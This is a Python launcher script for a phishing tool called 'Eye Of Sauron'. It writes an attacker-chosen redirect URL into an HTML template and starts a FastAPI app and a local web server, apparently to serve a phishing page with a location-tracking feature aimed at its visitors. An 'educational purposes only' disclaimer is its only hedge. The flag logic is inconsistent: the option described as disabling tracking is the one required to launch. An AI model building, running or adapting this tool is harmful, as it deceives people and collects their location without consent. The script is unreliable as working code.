import argparse
import re
import os

def search_and_replace(link):
    with open('Location.html','r') as file:
        file_contents=file.read()
        replacemenURL='window.location.replace("'+link+'");'
        updated_contents=re.sub('window.location.replace\(".*"\);', replacemenURL, file_contents)
    
    with open('index.html','w') as file:
        file.write(updated_contents)


def launch_Baradur():
    print("[!]Launching FastAPI and a basic http server in different consoles")
    os.system("x-terminal-emulator -e fastapi dev Baradur.py &") #Not the best apporach bas I like it quick n dirty
    os.system("x-terminal-emulator -e python3 -m http.server 8080 &")


def program():
    print('[!]Are ya phishing son?!')
    print('[!]DISCLAIMER: THE DEVELOPER OF THIS SCRIPT WILL NOT BE HELD LIABLE FOR POTENTIAL DAMAGES DONE WITH IT. YOU HAVE BEEN WARNED THIS IS A TOOL FOR EDUCATIONAL PURPOSES ONLY.')
    parser=argparse.ArgumentParser(
        prog='Eye Of Sauron',
        description='Just a little phishing framework',
        epilog='The coordinates are mine Sam !'
    )
    parser.add_argument('-l', action='store_true', help='Add to DISABLE the location tracking feature')
    parser.add_argument('-r', required=True, help='Add a URL to redirect to when the user clicks the button: https://google.com')
    #parser.print_help()
    #print(sys.argv[0])
    
    args=parser.parse_args()
    #print(f"-l flag set: {args.l}")
    #print(f"Value for -r: {args.r}")
    if not isinstance(args.r, str): #checks to see if the URL is a string
        parser.error("The -r argument must be a string.")
    if args.l==True:
        #print('All 3 args are here')
        search_and_replace(args.r)
        launch_Baradur()
        

    #elif args.r==None:
    #    print('Not all 3 args here')
    else:
        parser.print_help()
        return


def __main__():
    print('[+]Eye Of Sauron')
    program()
    
__main__()